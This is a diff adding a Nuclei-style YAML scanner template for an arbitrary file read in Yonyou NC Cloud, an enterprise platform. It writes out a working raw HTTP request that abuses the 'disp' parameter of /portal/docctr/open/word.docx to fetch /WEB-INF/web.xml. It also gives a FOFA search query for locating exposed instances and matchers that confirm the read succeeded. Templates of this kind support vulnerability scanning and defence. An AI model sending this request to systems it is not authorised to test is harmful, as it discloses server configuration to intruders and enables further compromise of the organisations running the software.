@@ -1,0 +1,26 @@
+id: word_docx
+info:
+  name: 用友NC Cloud任意文件读取
+  author: mike
+  severity: info
+  description: 用友 NC Cloud，大型企业数字化平台， 聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现 人、财、物、客的全面数字化，从而驱动业务创新与管理变革，与企业管理者一起重新定义未来的高度。
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: body="UClient.dmg"
+http:
+  - raw:
+      - |
+        GET /portal/docctr/open/word.docx?disp=/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "web-app"
